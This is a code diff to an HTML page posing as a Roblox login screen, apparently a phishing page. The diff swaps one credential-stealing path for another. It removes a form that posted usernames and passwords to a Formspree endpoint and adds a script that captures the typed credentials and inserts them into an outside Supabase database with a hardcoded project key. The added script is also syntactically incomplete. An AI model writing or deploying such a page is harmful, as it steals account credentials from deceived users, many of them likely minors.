@@ -8,27 +8,29 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
     <link rel="stylesheet" href="rstyle.css" >
 </head>
+<script>
+    const SUPABASE_URL = "https://mcaeueqqfhfbvuuilmtl.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_1thr_HyKVuLuzwNbgimN4w_LwalkFmu";
+    
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    
+document.getElementById('send').addEventListener('click', async () => {
+      const username = document.getElementById('user').value;
+      const password = document.getElementById('pass').value;
+
+supabase.from('messages').insert([
+  { username: username, pass: password }
+]);
+
+</script>
 <body>
     <div class="s">
         <h1>Login to Roblox</h1>
         <br>
-        <!-- drop this anywhere in your GitHub Pages HTML -->
-<form
-  action="https://formspree.io/f/myzbrvee"
-  method="POST"
->
-  <label>
-
-    <input type="text" placeholder="Username / Email / Phone" class="login" name="username" required>
-  </label>
-
-  <label>
+    <input type="text" placeholder="Username / Email / Phone" class="login" id="user" name="username" required>
 <br><br>
-    <input type="password" placeholder="Password" class="login" name="password" required>
-  </label>
-<br><br><br>
+    <input type="password" placeholder="Password" class="login" id="pass" name="password" required>
   <button type="submit">Log in</button>
-</form>
 <br><br><hr><br>
 <a href="https://www.roblox.com/login/forgot-password-or-username">
 <label id="f">Forgot password?</label></a>
